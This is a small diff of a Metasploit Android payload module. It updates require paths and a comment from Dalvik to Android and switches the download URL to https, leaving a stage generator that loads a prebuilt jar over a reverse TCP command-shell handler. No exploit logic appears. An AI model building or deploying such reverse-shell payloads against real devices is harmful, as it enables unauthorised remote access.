@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/payload/dalvik'
+require 'msf/core/payload/android'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -31,7 +30,7 @@ module MetasploitModule
   end
 
   #
-  # Override the {Payload::Dalvik} version so we can load a prebuilt jar
+  # Override the {Payload::Android} version so we can load a prebuilt jar
   # to be used as the final stage
   #
   def generate_stage(opts={})
